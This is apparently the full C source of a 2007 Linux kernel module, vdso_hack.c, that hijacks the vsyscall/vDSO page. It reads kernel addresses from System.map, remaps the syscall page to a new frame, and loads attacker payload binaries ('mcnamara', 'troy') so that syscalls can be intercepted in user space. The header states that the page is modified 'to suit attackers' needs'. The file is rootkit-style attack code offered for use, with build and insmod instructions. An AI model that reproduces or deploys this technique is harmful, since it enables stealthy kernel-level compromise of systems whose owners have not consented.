/*====================
==	vsyscall page hijacking: vdso_hack.c;
==	author: sbudella (Giuseppe Cocomazzi);
==	contact: sbudella at gmail.com;
==	date: 08 may 2007 - fixmapped vdso only;
==	      23 jul 2007 - randomized vdso; 
==	usage: make &&
==	       insmod vdso_hack.ko syscall_pages_addr=`echo 0x``grep syscall_pages /boot/System.map | cut -f0-1 -d" "``` __set_fixmap_addr=`echo 0x``grep __set_fixmap /boot/System.map | cut -f0-1 -d" "```
==	description: given the address of syscall_pages in kernel memory,
==		create a new page frame which will contain the code of
==		a vsyscall page modified to suit attackers' needs. Thus
==		the original syscall page will point to the hacked one,
==		and we can hijack syscalls directly in user-space without
==		even touching the syscall table.
==	license: gnu general public license, version 2;	
====================*/
		
#include <linux/init.h>
#include <linux/module.h>

#include <asm/fixmap.h>
#include <asm/pgalloc.h>

/* modify these as the size of the shared objs grows */
#define MCNAMARA_SIZE		2116
#define TROY_SIZE		2140	
#define DFLT_INT80_SIZE		2192
#define DFLT_SYSENTER_SIZE	2216	

/* modify these paths to resemble your cwd */
#define MCNAMARA_INCBIN		".incbin \"/home/sbudella/src/vdso/mcnamara\""
#define TROY_INCBIN		".incbin \"/home/sbudella/src/vdso/troy\""
#define DFLT_INT80_INCBIN	".incbin \"/home/sbudella/src/vdso/int80.so\""
#define DFLT_SYSENTER_INCBIN	".incbin \"/home/sbudella/src/vdso/sysent.so\""

/* retrieved from System.map */
#define SYSCALL_PAGES_ADDR	0xc07be240
#define SET_FIXMAP_ADDR		0xc0113e80

unsigned long syscall_pages_addr = SYSCALL_PAGES_ADDR;
unsigned long __set_fixmap_addr = SET_FIXMAP_ADDR;
module_param(syscall_pages_addr,long,0);
module_param(__set_fixmap_addr,long,0);

void *new_syscall_page = NULL;

void mcnamara(void);
void troy(void);
void default_int80(void);
void default_sysenter(void);

static int vdso_hack_init(void)
{
	new_syscall_page = (void *) get_zeroed_page(GFP_ATOMIC);
	struct page **o_syscall_pages = (struct page **) SYSCALL_PAGES_ADDR;
	void (*__set_fixmap_)(enum fixed_addresses idx,unsigned long phys,
                        pgprot_t flags) = (void *) SET_FIXMAP_ADDR;

	/* command line parameters */
	__set_fixmap_ = (void *) __set_fixmap_addr;
	o_syscall_pages = (struct page **) syscall_pages_addr;

#ifdef CONFIG_COMPAT_VDSO
	/* equivalent to clear_fixmap(FIX_VDSO) */
	__set_fixmap_(FIX_VDSO,0,__pgprot(0));

	/* new fixmapping for the vsyscall page */
        __set_fixmap_(FIX_VDSO,__pa(new_syscall_page),PAGE_READONLY_EXEC);

#else
	o_syscall_pages[0] = virt_to_page(new_syscall_page);

#endif

	if(!boot_cpu_has(X86_FEATURE_SEP)) {
		memcpy(new_syscall_page,mcnamara,MCNAMARA_SIZE);
		return 0;
	}	

	memcpy(new_syscall_page,troy,TROY_SIZE);

	return 0;

}

/* restore the original vsyscall page */
static void vdso_hack_exit(void)
{
	if(!boot_cpu_has(X86_FEATURE_SEP))
		memcpy(new_syscall_page,default_int80,DFLT_INT80_SIZE);
	
	memcpy(new_syscall_page,default_sysenter,DFLT_SYSENTER_SIZE);
}

void mcnamara(void)
{
	__asm__(MCNAMARA_INCBIN);
}

void troy(void)
{
	__asm__(TROY_INCBIN);
}

void default_sysenter(void)
{
	__asm__(DFLT_SYSENTER_INCBIN);
}

void default_int80(void)
{
	__asm__(DFLT_INT80_INCBIN);
}

module_init(vdso_hack_init);
module_exit(vdso_hack_exit);
MODULE_LICENSE("GPL");
